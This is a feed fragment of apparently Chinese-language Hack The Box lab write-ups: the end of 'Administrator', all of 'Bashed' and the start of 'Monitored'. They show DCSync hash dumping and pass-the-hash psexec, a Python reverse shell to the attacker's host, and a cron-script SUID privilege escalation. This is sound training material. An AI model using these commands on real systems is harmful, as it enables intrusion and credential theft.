&lt;p&gt;&lt;em&gt;PS：&lt;a href=&#34;https://github.com/ShutdownRepo/targetedKerberoast&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;targetedKerberoast&lt;/a&gt;.py 跟impacket-GetUserSPNs功能大致一样，但它会尝试对可写入SPN的对象写入SPN属性后，再获取SPN。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;用john破解ethan的SPN后获取密码：&lt;strong&gt;limpbizkit&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;因为ethan对DC有DCSync权限，则可以用Impacket-secresdump来直接dump域内密码：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
impacket-secretsdump Administrator/ethan:&amp;#039;limpbizkit&amp;#039;@10.10.11.42
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
&lt;p&gt;[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[&lt;em&gt;] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[&lt;/em&gt;] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[&lt;em&gt;] Kerberos keys grabbed
&amp;hellip;&amp;hellip;.
[&lt;/em&gt;] Cleaning up&amp;hellip;
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;获取Administrator的NTLM hash，用impacket-psexec尝试登录:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
impacket-psexec -hashes :3dc553ce4b9fd20bd016e098d2d2fd2e Administrator/Administrator@10.10.11.42                  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
&lt;p&gt;[&lt;em&gt;] Requesting shares on 10.10.11.42&amp;hellip;..
[&lt;/em&gt;] Found writable share ADMIN$
[&lt;em&gt;] Uploading file PPzOqLvu.exe
[&lt;/em&gt;] Opening SVCManager on 10.10.11.42&amp;hellip;..
[&lt;em&gt;] Creating service ecOM on 10.10.11.42&amp;hellip;..
[&lt;/em&gt;] Starting service ecOM&amp;hellip;..
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.&lt;/p&gt;
&lt;p&gt;C:\Windows\system32&amp;gt; whoami
nt authority\system
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;h2 id=&#34;user-and-root-flags&#34;&gt;User and Root flags
&lt;/h2&gt;&lt;p&gt;在C:\Users\Emily\Desktop 下发现user flag:&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;405&#34; height=&#34;235&#34; src=&#34;../legacy/uploads/2025/04/1745035376-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1276&#34; srcset=&#34;../legacy/uploads/2025/04/1745035376-image.png 405w, ../legacy/uploads/2025/04/1745035376-image-300x174.png 300w&#34; sizes=&#34;auto, (max-width: 405px) 100vw, 405px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在C:\users\Administrator\Desktop 下发现root flag:&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;363&#34; height=&#34;225&#34; src=&#34;../legacy/uploads/2025/04/1745035426-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1277&#34; srcset=&#34;../legacy/uploads/2025/04/1745035426-image.png 363w, ../legacy/uploads/2025/04/1745035426-image-300x186.png 300w&#34; sizes=&#34;auto, (max-width: 363px) 100vw, 363px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Happy Hacking.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HTB-Bashed-Writeup</title>
        <link>http://localhost:1313/htb-bashed-Writeup/</link>
        <pubDate>Sat, 19 Apr 2025 07:25:07 +0000</pubDate>
        
        <guid>http://localhost:1313/htb-bashed-Writeup/</guid>
        <description>&lt;img src="http://localhost:1313/legacy/uploads/2025/04/1745047500-bashed-150x150.webp" alt="Featured image of post HTB-Bashed-Writeup" /&gt;&lt;h2 id=&#34;machine-information&#34;&gt;Machine Information
&lt;/h2&gt;&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    Difficulty: Easy
  &lt;/li&gt;
&lt;/ul&gt;
&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    OS: Linux
  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;nmap-result&#34;&gt;Nmap Result
&lt;/h2&gt;&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel&amp;#039;s Development Site
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
Device type: general purpose
Running: Linux 3.X|4.X
&lt;/pre&gt;
&lt;/div&gt;
&lt;h2 id=&#34;initial-foothold&#34;&gt;Initial Foothold
&lt;/h2&gt;&lt;p&gt;打开浏览器访问页面，作者有说机器上部署了php bash。&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;479&#34; src=&#34;../legacy/uploads/2025/04/1745044852-image-1024x479.png&#34; alt=&#34;&#34; class=&#34;wp-image-1290&#34; srcset=&#34;../legacy/uploads/2025/04/1745044852-image-1024x479.png 1024w, ../legacy/uploads/2025/04/1745044852-image-300x140.png 300w, ../legacy/uploads/2025/04/1745044852-image-768x359.png 768w, ../legacy/uploads/2025/04/1745044852-image-1536x719.png 1536w, ../legacy/uploads/2025/04/1745044852-image.png 1671w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;查看这个github网站：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;179&#34; src=&#34;../legacy/uploads/2025/04/1745046706-image-1024x179.png&#34; alt=&#34;&#34; class=&#34;wp-image-1304&#34; srcset=&#34;../legacy/uploads/2025/04/1745046706-image-1024x179.png 1024w, ../legacy/uploads/2025/04/1745046706-image-300x52.png 300w, ../legacy/uploads/2025/04/1745046706-image-768x134.png 768w, ../legacy/uploads/2025/04/1745046706-image.png 1302w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;一个semi-interactive web shell. 既然作者说了有，尝试ffuf找出在哪里。&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.68/FUZZ      
&lt;p&gt;images                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 7ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 10ms]
uploads                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 14ms]
dev                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 11ms]
php                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 9ms]
fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 7ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 1373ms]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 6ms]&lt;/p&gt;
&lt;p&gt;ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://10.10.10.68/FUZZ&lt;/p&gt;
&lt;p&gt;index.html              [Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 11ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 10ms]
contact.html            [Status: 200, Size: 7805, Words: 2630, Lines: 157, Duration: 8ms]
.htaccess               [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 6ms]
style.css               [Status: 200, Size: 24164, Words: 4814, Lines: 1412, Duration: 5ms]
.                       [Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 7ms]
about.html              [Status: 200, Size: 8193, Words: 2878, Lines: 155, Duration: 6ms]
.html                   [Status: 403, Size: 291, Words: 22, Lines: 12, Duration: 13ms]
.php                    [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 9ms]
.htpasswd               [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 7ms]
.htm                    [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 5ms]
.htpasswds              [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 5ms]
.htgroup                [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 7ms]
wp-forum.phps           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 5ms]
.htaccess.bak           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 6ms]
.htuser                 [Status: 403, Size: 293, Words: 22, Lines: 12, Duration: 8ms]
.ht                     [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 5ms]
.htc                    [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 7ms]
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;在/dev下找到phpbash.php&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1002&#34; height=&#34;1024&#34; src=&#34;../legacy/uploads/2025/04/1745045013-image-1002x1024.png&#34; alt=&#34;&#34; class=&#34;wp-image-1293&#34; srcset=&#34;../legacy/uploads/2025/04/1745045013-image-1002x1024.png 1002w, ../legacy/uploads/2025/04/1745045013-image-294x300.png 294w, ../legacy/uploads/2025/04/1745045013-image-768x785.png 768w, ../legacy/uploads/2025/04/1745045013-image.png 1134w&#34; sizes=&#34;auto, (max-width: 1002px) 100vw, 1002px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;并可以直接获得user flag&lt;figure class=&#34;wp-block-image size-full is-resized&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;768&#34; height=&#34;387&#34; src=&#34;../legacy/uploads/2025/04/1745045054-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1294&#34; style=&#34;width:768px;height:auto&#34; srcset=&#34;../legacy/uploads/2025/04/1745045054-image.png 768w, ../legacy/uploads/2025/04/1745045054-image-300x151.png 300w&#34; sizes=&#34;auto, (max-width: 768px) 100vw, 768px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation
&lt;/h2&gt;&lt;p&gt;因为是一个semi interactive，如果上传例如linpeas或者pspy这样的文件执行会看不到输出，所以得想办法拿到一个fully interactive shell。在&lt;a href=&#34;https://www.revshells.com/&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;&lt;a class=&#34;link&#34; href=&#34;https://www.revshells.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.revshells.com/&lt;/a&gt;&lt;/a&gt;网站生成了bash，sh，php的，都没用。最后使用python的reverse shell成功：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: python; title: ; notranslate&#34; title=&#34;&#34;&gt;
# phpbash
&lt;p&gt;export RHOST=&amp;ldquo;10.10.16.11&amp;rdquo;;export RPORT=80;python -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&amp;ldquo;RHOST&amp;rdquo;),int(os.getenv(&amp;ldquo;RPORT&amp;rdquo;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&amp;ldquo;sh&amp;rdquo;)&#39;&lt;/p&gt;
&lt;h1 id=&#34;kali&#34;&gt;kali
&lt;/h1&gt;&lt;p&gt;nc -nlvp 80
listening on [any] 80 &amp;hellip;
connect to [10.10.16.11] from (UNKNOWN) [10.10.10.68] 33862
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/p&gt;
&lt;h1 id=&#34;使用python获得ttyshell&#34;&gt;使用python获得ttyshell
&lt;/h1&gt;&lt;p&gt;python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
www-data@bashed:/
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;sudo -l得知www-data可以以sciprtmanager执行任意指令。&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;171&#34; src=&#34;../legacy/uploads/2025/04/1745046265-image-1024x171.png&#34; alt=&#34;&#34; class=&#34;wp-image-1297&#34; srcset=&#34;../legacy/uploads/2025/04/1745046265-image-1024x171.png 1024w, ../legacy/uploads/2025/04/1745046265-image-300x50.png 300w, ../legacy/uploads/2025/04/1745046265-image-768x128.png 768w, ../legacy/uploads/2025/04/1745046265-image.png 1065w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在根目录下找到一个不常见的文件夹: scriptmanager. 先以scriptmanager打开一个新shell，并打开看看有什么：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2  2022 scripts
&lt;p&gt;www-data@bashed:/$ sudo -u scriptmanager /bin/bash
sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/scripts$ ls -l
ls -l
total 12
-rw-r&amp;ndash;r&amp;ndash; 1 scriptmanager scriptmanager 58 Dec  4  2017 test.py
-rw-r&amp;ndash;r&amp;ndash; 1 root          root          12 Apr 19 00:17 test.txt
scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open(&amp;ldquo;test.txt&amp;rdquo;, &amp;ldquo;w&amp;rdquo;)
f.write(&amp;ldquo;testing 123!&amp;rdquo;)
f.close
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;一个测试用的python文件，猜测可能会被自动运行？上传pspy并观察：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;90&#34; src=&#34;../legacy/uploads/2025/04/1745046227-image-1024x90.png&#34; alt=&#34;&#34; class=&#34;wp-image-1295&#34; srcset=&#34;../legacy/uploads/2025/04/1745046227-image-1024x90.png 1024w, ../legacy/uploads/2025/04/1745046227-image-300x26.png 300w, ../legacy/uploads/2025/04/1745046227-image-768x68.png 768w, ../legacy/uploads/2025/04/1745046227-image.png 1246w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;发现root用户会每隔一段时间运行/scripts文件夹下所有的python文件，那么提权就很简单了。在scripts/ 下创建一个设置bash suid的python文件：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
echo &amp;#039;import os; os.system(&#34;chmod u+s /bin/bash&#34;)&amp;#039; &amp;gt; exploit.py
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;等待root运行：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;320&#34; src=&#34;../legacy/uploads/2025/04/1745047231-image-1024x320.png&#34; alt=&#34;&#34; class=&#34;wp-image-1316&#34; srcset=&#34;../legacy/uploads/2025/04/1745047231-image-1024x320.png 1024w, ../legacy/uploads/2025/04/1745047231-image-300x94.png 300w, ../legacy/uploads/2025/04/1745047231-image-768x240.png 768w, ../legacy/uploads/2025/04/1745047231-image.png 1251w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在设置suid后使用/bin/bash -p提权，并在root路径下获取flag：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;479&#34; height=&#34;236&#34; src=&#34;../legacy/uploads/2025/04/1745046632-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1301&#34; srcset=&#34;../legacy/uploads/2025/04/1745046632-image.png 479w, ../legacy/uploads/2025/04/1745046632-image-300x148.png 300w&#34; sizes=&#34;auto, (max-width: 479px) 100vw, 479px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Happy hacking&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HTB-Season 6-Monitored</title>
        <link>http://localhost:1313/htb-season-6-monitored/</link>
        <pubDate>Wed, 01 Jan 2025 08:44:04 +0000</pubDate>
        
        <guid>http://localhost:1313/htb-season-6-monitored/</guid>
        <description>&lt;img src="http://localhost:1313/legacy/uploads/2024/08/1724822083-monitor-150x150.webp" alt="Featured image of post HTB-Season 6-Monitored" /&gt;&lt;div class=&#34;wp-block-image&#34;&gt;
  &lt;figure class=&#34;aligncenter size-full&#34;&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;300&#34; height=&#34;300&#34; src=&#34;../wp-contnt/uploads/2024/08/1724834633-monitor.webp&#34; alt=&#34;&#34; class=&#34;wp-image-280&#34; srcset=&#34;../legacy/uploads/2024/08/1724834633-monitor.webp 300w, ../legacy/uploads/2024/08/1724834633-monitor-150x150.webp 150w&#34; sizes=&#34;auto, (max-width: 300px) 100vw, 300px&#34; /&gt;&lt;/figure&gt;
&lt;/div&gt;
&lt;p&gt;Medium难度，好像这个机器还有两个前身，一个Monitored，一个Monitored2. 这次图片上变成3了。&lt;/p&gt;
&lt;h2 id=&#34;nmap&#34;&gt;#NMAP
&lt;/h2&gt;&lt;p&gt;先扫端口:&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; \n
protocol 2.0)
| ssh-hostkey:
| 256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNwl884vMmev5jgPEogyyLoyjEHsq+F9DzOCgtCA4P8TH2TQcymOgliq7Yzf7x1tL+i2mJedm2BGMKOv1NXXfN0=
| 256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
|ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN5W5QMRdl0vUKFiq9AiP+TVxKIgpRQNyo25qNs248Pa 
80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) 
|_http-server-header:nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
| http-methods: | Supported Methods: GET HEAD POST OPTIONS&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;port-80&#34;&gt;#PORT 80
&lt;/h2&gt;&lt;p&gt;把monitorsthree.htb先加到host里然后访问：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;575&#34; src=&#34;../wp-contnt/uploads/2024/08/1724824509-image-1024x575.png&#34; alt=&#34;&#34; class=&#34;wp-image-105&#34; srcset=&#34;../legacy/uploads/2024/08/1724824509-image-1024x575.png 1024w, ../legacy/uploads/2024/08/1724824509-image-300x169.png 300w, ../legacy/uploads/2024/08/1724824509-image-768x432.png 768w, ../legacy/uploads/2024/08/1724824509-image-1536x863.png 1536w, ../legacy/uploads/2024/08/1724824509-image.png 1858w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;一个提供网络服务的网站。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://monitorsthree.htb/login.php&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;&lt;a class=&#34;link&#34; href=&#34;http://monitorsthree.htb/login.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://monitorsthree.htb/login.php&lt;/a&gt;&lt;/a&gt; 登录界面，尝试弱口令爆破失败。&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;575&#34; src=&#34;../wp-contnt/uploads/2024/08/1724823785-1-1024x575.png&#34; alt=&#34;&#34; class=&#34;wp-image-98&#34; srcset=&#34;../legacy/uploads/2024/08/1724823785-1-1024x575.png 1024w, ../legacy/uploads/2024/08/1724823785-1-300x169.png 300w, ../legacy/uploads/2024/08/1724823785-1-768x431.png 768w, ../legacy/uploads/2024/08/1724823785-1-1536x863.png 1536w, ../legacy/uploads/2024/08/1724823785-1.png 1860w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://monitorsthree.htb/forgot_password.php&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;&lt;a class=&#34;link&#34; href=&#34;http://monitorsthree.htb/forgot_password.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://monitorsthree.htb/forgot_password.php&lt;/a&gt;&lt;/a&gt; 还有一个忘记密码页面，用来重设密码。&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;823&#34; height=&#34;772&#34; src=&#34;../wp-contnt/uploads/2024/08/1724824640-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-107&#34; srcset=&#34;../legacy/uploads/2024/08/1724824640-image.png 823w, ../legacy/uploads/2024/08/1724824640-image-300x281.png 300w, ../legacy/uploads/2024/08/1724824640-image-768x720.png 768w&#34; sizes=&#34;auto, (max-width: 823px) 100vw, 823px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;尝试修改admin密码：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;567&#34; height=&#34;639&#34; src=&#34;../wp-contnt/uploads/2024/08/1724824751-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-109&#34; srcset=&#34;../legacy/uploads/2024/08/1724824751-image.png 567w, ../legacy/uploads/2024/08/1724824751-image-266x300.png 266w&#34; sizes=&#34;auto, (max-width: 567px) 100vw, 567px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;尝试其他的用户名：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;562&#34; height=&#34;668&#34; src=&#34;../wp-contnt/uploads/2024/08/1724824799-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-112&#34; srcset=&#34;../legacy/uploads/2024/08/1724824799-image.png 562w, ../legacy/uploads/2024/08/1724824799-image-252x300.png 252w&#34; sizes=&#34;auto, (max-width: 562px) 100vw, 562px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;说明admin用户存在。用gobuster遍历目录：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;449&#34; src=&#34;../wp-contnt/uploads/2024/08/1724823981-2-1024x449.png&#34; alt=&#34;&#34; class=&#34;wp-image-103&#34; srcset=&#34;../legacy/uploads/2024/08/1724823981-2-1024x449.png 1024w, ../legacy/uploads/2024/08/1724823981-2-300x132.png 300w, ../legacy/uploads/2024/08/1724823981-2-768x337.png 768w, ../legacy/uploads/2024/08/1724823981-2-1536x673.png 1536w, ../legacy/uploads/2024/08/1724823981-2.png 1891w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;用filename wordlist遍历各个目录找到了&lt;a href=&#34;http://monitorsthree.htb/admin/navbar.php&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;&lt;a class=&#34;link&#34; href=&#34;http://monitorsthree.htb/admin/navbar.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://monitorsthree.htb/admin/navbar.php&lt;/a&gt;&lt;/a&gt;可以不用验证直接访问。但除此之外没有找到有用的东西。&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;650&#34; src=&#34;../wp-contnt/uploads/2024/08/1724824886-image-1024x650.png&#34; alt=&#34;&#34; class=&#34;wp-image-117&#34; srcset=&#34;../legacy/uploads/2024/08/1724824886-image-1024x650.png 1024w, ../legacy/uploads/2024/08/1724824886-image-300x190.png 300w, ../legacy/uploads/2024/08/1724824886-image-768x487.png 768w, ../legacy/uploads/2024/08/1724824886-image.png 1455w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;cactimonitorshtb&#34;&gt;#cacti.monitors.htb
&lt;/h3&gt;&lt;p&gt;用ffuf遍历可能的subdomain：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;449&#34; src=&#34;../wp-contnt/uploads/2024/08/1724825032-image-1024x449.png&#34; alt=&#34;&#34; class=&#34;wp-image-122&#34; srcset=&#34;../legacy/uploads/2024/08/1724825032-image-1024x449.png 1024w, ../legacy/uploads/2024/08/1724825032-image-300x131.png 300w, ../legacy/uploads/2024/08/1724825032-image-768x336.png 768w, ../legacy/uploads/2024/08/1724825032-image-1536x673.png 1536w, ../legacy/uploads/2024/08/1724825032-image.png 1872w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;发现子域名：&lt;strong&gt;cacti&lt;/strong&gt;，加入hosts文件并访问。&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
